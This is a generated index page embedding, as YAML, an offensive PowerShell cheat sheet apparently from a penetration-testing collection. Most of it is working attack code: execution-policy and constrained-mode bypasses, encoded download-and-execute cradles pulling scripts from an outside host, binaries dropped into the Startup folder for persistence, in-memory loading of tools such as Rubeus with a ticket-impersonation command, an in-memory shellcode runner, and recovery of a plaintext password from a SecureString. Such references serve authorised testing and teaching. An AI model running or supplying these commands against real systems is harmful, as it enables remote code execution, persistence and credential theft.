---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Powershell

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-cheatsheets-powershell-cheatsheet` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cheatsheets/powershell-cheatsheet.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Powershell](../../topics/cheatsheets/powershell.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-cheatsheets-powershell-cheatsheet |
| name | Powershell |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/cheatsheets/powershell-cheatsheet.md |

## Preserved Source Material

````yaml
_body: "# Powershell\n\n## Summary\n\n- [Powershell](#powershell)\n    - [Summary](#summary)\n    - [Execution Policy](#execution-policy)\n\
  \    - [Encoded Commands](#encoded-commands)\n    - [Constrained Mode](#constrained-mode)\n    - [Encoded Commands](#encoded-commands)\n\
  \    - [Download file](#download-file)\n    - [Load Powershell scripts](#load-powershell-scripts)\n    - [Load C# assembly\
  \ reflectively](#load-c-assembly-reflectively)\n    - [Call Win API using delegate functions with Reflection](#call-win-api-using-delegate-functions-with-reflection)\n\
  \        - [Resolve address functions](#resolve-address-functions)\n        - [DelegateType Reflection](#delegatetype-reflection)\n\
  \        - [Example with a simple shellcode runner](#example-with-a-simple-shellcode-runner)\n    - [Secure String to Plaintext](#secure-string-to-plaintext)\n\
  \    - [References](#references)\n\n## Execution Policy\n\n```ps1\npowershell -EncodedCommand $encodedCommand\npowershell\
  \ -ep bypass ./PowerView.ps1\n\n# Change execution policy\nSet-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted\n\
  Set-ExecutionPolicy Bypass -Scope Process\n```\n\n## Constrained Mode\n\n```ps1\n# Check if we are in a constrained mode\n\
  # Values could be: FullLanguage or ConstrainedLanguage\n$ExecutionContext.SessionState.LanguageMode\n\n## Bypass\npowershell\
  \ -version 2\n```\n\n## Encoded Commands\n\n- Windows\n\n    ```ps1\n    $command = 'IEX (New-Object Net.WebClient).DownloadString(\"\
  http://10.10.10.10/PowerView.ps1\")'\n    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)\n    $encodedCommand\
  \ = [Convert]::ToBase64String($bytes)\n    ```\n\n- Linux: :warning: UTF-16LE encoding is required\n\n    ```ps1\n    echo\
  \ 'IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.10.10/PowerView.ps1\")' | iconv -t utf-16le | base64 -w\
  \ 0\n    ```\n\n## Download file\n\n```ps1\n# Any version\n(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/PowerView.ps1\"\
  , \"C:\\Windows\\Temp\\PowerView.ps1\")\nwget \"http://10.10.10.10/taskkill.exe\" -OutFile \"C:\\ProgramData\\unifivideo\\\
  taskkill.exe\"\nImport-Module BitsTransfer; Start-BitsTransfer -Source $url -Destination $output\n\n# Powershell 4+\nIWR\
  \ \"http://10.10.10.10/binary.exe\" -OutFile \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\binary.exe\"\
  \nInvoke-WebRequest \"http://10.10.10.10/binary.exe\" -OutFile \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\\
  StartUp\\binary.exe\"\n```\n\n## Load Powershell scripts\n\n```ps1\n# Proxy-aware\nIEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1')\n\
  echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1') | powershell -noprofile -\npowershell\
  \ -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.10.10/PowerView.ps1')|iex\"\
  \n\n# Non-proxy aware\n$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.10.10/PowerView.ps1',$false);$h.send();iex\
  \ $h.responseText\n```\n\n## Load C# assembly reflectively\n\n```powershell\n# Download and run assembly without arguments\n\
  $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')\n$assem = [System.Reflection.Assembly]::Load($data)\n\
  [rev.Program]::Main()\n\n# Download and run Rubeus, with arguments (make sure to split the args)\n$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')\n\
  $assem = [System.Reflection.Assembly]::Load($data)\n[Rubeus.Program]::Main(\"s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e\
  \ /impersonateuser:administrator /msdsspn:cifs/file01 /ptt\".Split())\n\n# Execute a specific method from an assembly (e.g.\
  \ a DLL)\n$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')\n$assem = [System.Reflection.Assembly]::Load($data)\n\
  $class = $assem.GetType(\"ClassLibrary1.Class1\")\n$method = $class.GetMethod(\"runner\")\n$method.Invoke(0, $null)\n```\n\
  \n## Call Win API using delegate functions with Reflection\n\n### Resolve address functions\n\nTo perform reflection we\
  \ first need to obtain `GetModuleHandle` and `GetProcAdresse` to be able to lookup of Win32 API function addresses.\n\n\
  To retrieve those function we will need to find out if there are included inside the existing loaded Assemblies.\n\n```powershell\n\
  # Retrieve all loaded Assemblies\n$Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()\n\nIterate over all the Assemblies,\
  \ to retrieve all the Static and Unsafe Methods \n$Assemblies |\n  ForEach-Object {\n    $_.GetTypes()|\n      ForEach-Object\
  \ {\n          $_ | Get-Member -Static| Where-Object {\n            $_.TypeName.Contains('Unsafe')\n          }\n      }\
  \ 2> $nul l\n```\n\nWe want to find where the Assemblies are located, so we will use the statement `Location`. Then we will\
  \ look for all the methods inside the Assembly `Microsoft.Win32.UnsafeNativeMethods`\nTBN: `GetModuleHandle` and `GetProcAddress`\
  \ are located in `C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System\\v4.0_4.0.0.0__b77a5c561934e089\\System.dll`\n\n\
  If we want to use those function we need in a first time get a reference to the .dll file we need the object to have the\
  \ property `GlobalAssemblyCache` set (The Global Assembly Cache is essentially a list of all native and registered assemblies\
  \ on Windows, which will allow us to filter out non-native assemblies). The second filter is to retrieve the `System.dll`.\n\
  \n```powershell\n$systemdll = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { \n  $_.GlobalAssemblyCache -And\
  \ $_.Location.Split('\\\\')[-1].Equals('System.dll') \n})\n  \n$unsafeObj = $systemdll.GetType('Microsoft.Win32.UnsafeNativeMethods')\n\
  ```\n\nTo retrieve the method `GetModuleHandle`, we can use the method `GetMethod(<METHOD_NAME>)` to retrieve it.\n`$GetModuleHandle\
  \ = $unsafeObj.GetMethod('GetModuleHandle')`\n\nNow we can use the `Invoke` method of our object `$GetModuleHandle` to get\
  \ a reference of an unmanaged DLL.\nInvoke takes two arguments and both are objects:\n\n- The first argument is the object\
  \ to invoke it on but since we use it on a static method we may set it to \"$null\".\n- The second argument is an array\
  \ consisting of the arguments for the method we are invoking (GetModuleHandle). Since the Win32 API only takes the name\
  \ of the DLL as a string we only need to supply that.\n`$GetModuleHandle.Invoke($null, @(\"user32.dll\"))`\n\nHowever, we\
  \ want to use the same method to use the function `GetProcAddress`, it won't work due to the fact that our `System.dll`\
  \ object retrieved contains multiple occurences of the method `GetProcAddress`. Therefore the internal method `GetMethod()`\
  \ will throw an error `\"Ambiguous match found.\"`.\n\nTherefore we will use the method `GetMethods()` to get all the available\
  \ methods and then iterate over them to retrieve only those we want.\n\n```powershell\n$unsafeObj.GetMethods() | ForEach-Object\
  \ {If($_.Name -eq \"GetProcAddress\") {$_}}\n```\n\nIf we want to get the `GetProcAddress` reference, we will construct\
  \ an array to store our matching object and use the first entry.\n\n```powershell\n$unsafeObj.GetMethods() | ForEach-Object\
  \ {If($_.Name -eq \"GetProcAddress\") {$tmp+=$_}}\n$GetProcAddress = $tmp[0]\n```\n\nWe need to take the first one, because\
  \ the arguments type of the second one does not match with ours.\n\nAlternatively we can use `GetMethod` function to precise\
  \ the argument types that we want.\n\n```powershell\n$GetProcAddress = $unsafeObj.GetMethod('GetProcAddress',\n        [reflection.bindingflags]'Public,Static',\
  \ \n        $null, \n                             [System.Reflection.CallingConventions]::Any,\n                       \
  \      @([System.IntPtr], [string]), \n                             $null);\n```\n\ncf: [https://learn.microsoft.com/en-us/dotnet/api/system.type.getmethod?view=net-7.0](https://learn.microsoft.com/en-us/dotnet/api/system.type.getmethod?view=net-7.0)\n\
  \nNow we have everything to resolve any function address we want.\n\n```powershell\n$user32 = $GetModuleHandle.Invoke($null,\
  \ @(\"user32.dll\"))\n$tmp=@()\n$unsafeObj.GetMethods() | ForEach-Object {If($_.Name -eq \"GetProcAddress\") {$tmp+=$_}}\n\
  $GetProcAddress = $tmp[0]\n$GetProcAddress.Invoke($null, @($user32, \"MessageBoxA\"))\n```\n\nIf we put everything in a\
  \ function:\n\n```powershell\nfunction LookupFunc {\n\n    Param ($moduleName, $functionName)\n\n    $assem = ([AppDomain]::CurrentDomain.GetAssemblies()\
  \ | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n\
  \    $tmp=@()\n    $assem.GetMethods() | ForEach-Object {If($_.Name -eq \"GetProcAddress\") {$tmp+=$_}}\n    return $tmp[0].Invoke($null,\
  \ @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))\n}\n```\n\n### DelegateType Reflection\n\
  \nTo be able to use the function that we have retrieved the address, we need to pair the information about the number of\
  \ arguments and their associated data types with the resolved function memory address. This is done through `DelegateType`.\n\
  The DelegateType Reflection consists in manually create an assembly in memory and populate it with content.\n\nThe first\
  \ step is to create a new assembly with the class `AssemblyName` and assign it a name.\n\n```powershell\n$MyAssembly = New-Object\
  \ System.Reflection.AssemblyName('ReflectedDelegate')\n```\n\nNow we want to set permission on our Assembly. We need to\
  \ set it to executable and to not be saved to the disk. For that the method `DefineDynamicAssembly` will be used.\n\n```powershell\n\
  $Domain = [AppDomain]::CurrentDomain\n$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)\n\
  ```\n\nNow that everything is set, we can start creating content inside our assembly. First, we will need to create the\
  \ main building block which is a Module. This can be done through the method `DefineDynamicModule`\nThe method need a custom\
  \ name as the first argument and a boolean indicating if we want to include symbols or not.\n\n```powershell\n$MyModuleBuilder\
  \ = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)\n```\n\nThe next step consists by creating a custom\
  \ type that will become our delegate type. It can be done with the method `DefineType`.\nThe arguments are:\n\n- a custom\
  \ name\n- the attributes of the type\n- the type it build on top of\n\n```powershell\n$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType',\
  \ 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n```\n\nThen we will need to set the prototype\
  \ of our function.\nFirst we need to use the method `DefineConstructor` to define a constructor. The method takes three\
  \ arguments:\n\n- the attributes of the constructor\n- calling convention\n- the parameter types of the constructor that\
  \ will become the function prototype\n\n```powershell\n$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor('RTSpecialName,\
  \ HideBySig, Public',\n                                                        [System.Reflection.CallingConventions]::Standard,\n\
  \                                                        @([IntPtr], [String], [String], [int]))\n```\n\nThen we need to\
  \ set some implementation flags with the method `SetImplementationFlags`.\n\n```powershell\n$MyConstructorBuilder.SetImplementationFlags('Runtime,\
  \ Managed')\n```\n\nTo be able to call our function, we need to define the `Invoke` method in our delegate type. For that\
  \ the method `DefineMethod` allows us to do that.\nThe method takes four arguments:\n\n- name of the method defined\n- method\
  \ attributes\n- return type\n- array of argument types\n\n```powershell\n$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke',\n\
  \                                                'Public, HideBySig, NewSlot, Virtual',\n                              \
  \                  [int],\n                                                @([IntPtr], [String], [String], [int]))\n```\n\
  \nIf we put everything in a function:\n\n```powershell\nfunction Get-Delegate\n{\n    Param (\n        [Parameter(Position\
  \ = 0, Mandatory = $True)] [IntPtr] $funcAddr, # Function address\n        [Parameter(Position = 1, Mandatory = $True)]\
  \ [Type[]] $argTypes, # array with the argument types\n        [Parameter(Position = 2)] [Type] $retType = [Void] # Return\
  \ type\n    )\n\n    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')),\
  \ [System.Reflection.Emit.AssemblyBuilderAccess]::Run).\n    DefineDynamicModule('QM', $false).\n    DefineType('QT', 'Class,\
  \ Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n    $type.DefineConstructor('RTSpecialName, HideBySig,\
  \ Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')\n    $type.DefineMethod('Invoke',\
  \ 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')\n    $delegate\
  \ = $type.CreateType()\n\n    return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr,\
  \ $delegate)\n}\n```\n\n### Example with a simple shellcode runner\n\n```powershell\n# Create a Delegate function  to be\
  \ able to call the function that we have the address\nfunction Get-Delegate\n{\n    Param (\n        [Parameter(Position\
  \ = 0, Mandatory = $True)] [IntPtr] $funcAddr, # Function address\n        [Parameter(Position = 1, Mandatory = $True)]\
  \ [Type[]] $argTypes, # array with the argument types\n        [Parameter(Position = 2)] [Type] $retType = [Void] # Return\
  \ type\n    )\n\n    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')),\
  \ [System.Reflection.Emit.AssemblyBuilderAccess]::Run).\n    DefineDynamicModule('QM', $false).\n    DefineType('QT', 'Class,\
  \ Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n    $type.DefineConstructor('RTSpecialName, HideBySig,\
  \ Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')\n    $type.DefineMethod('Invoke',\
  \ 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')\n    $delegate\
  \ = $type.CreateType()\n\n    return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr,\
  \ $delegate)\n}\n# Allow to retrieve function address from a dll\nfunction LookupFunc {\n\n Param ($moduleName, $functionName)\n\
  \n $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\
  \\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n    $tmp=@()\n    $assem.GetMethods() |\
  \ ForEach-Object {If($_.Name -eq \"GetProcAddress\") {$tmp+=$_}}\n return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,\
  \ @($moduleName)), $functionName))\n}\n\n# Simple Shellcode runner using delegation\n$VirtualAllocAddr = LookupFunc \"Kernel32.dll\"\
  \ \"VirtualAlloc\"\n$CreateThreadAddr = LookupFunc \"Kernel32.dll\" \"CreateThread\"\n$WaitForSingleObjectAddr = LookupFunc\
  \ \"Kernel32.dll\" \"WaitForSingleObject\" \n\n\n$VirtualAlloc = Get-Delegate $VirtualAllocAddr @([IntPtr], [UInt32], [UInt32],\
  \ [UInt32]) ([IntPtr])\n$CreateThread = Get-Delegate $CreateThreadAddr @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32],\
  \ [IntPtr]) ([IntPtr])\n$WaitForSingleObject = Get-Delegate $WaitForSingleObjectAddr @([IntPtr], [Int32]) ([Int])\n\n[Byte[]]\
  \ $buf = 0xfc,0x48,0x83,0xe4,0xf0 ...\n\n$mem = $VirtualAlloc.Invoke([IntPtr]::Zero, $buf.Length, 0x3000, 0x40)\n[System.Runtime.InteropServices.Marshal]::Copy($buf,\
  \ 0, $mem, $buf.Length)\n$hThread = $CreateThread.Invoke([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)\n$WaitForSingleObject.Invoke($hThread,\
  \ 0xFFFFFFFF)\n\n```\n\n## Secure String to Plaintext\n\n```ps1\n$pass = \"01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692\"\
  \ | convertto-securestring\n$user = \"HTB\\Tom\"\n$cred = New-Object System.management.Automation.PSCredential($user, $pass)\n\
  $cred.GetNetworkCredential() | fl\nUserName       : Tom\nPassword       : 1ts-mag1c!!!\nSecurePassword : System.Security.SecureString\n\
  Domain         : HTB\n```\n\n## References\n\n- [Windows & Active Directory Exploitation Cheat Sheet and Command Reference\
  \ - @chvancooten](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/)\n\
  - [Basic PowerShell for Pentesters - HackTricks](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters)"
_relative_path: cheatsheets/powershell-cheatsheet.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cheatsheets/powershell-cheatsheet.md
````
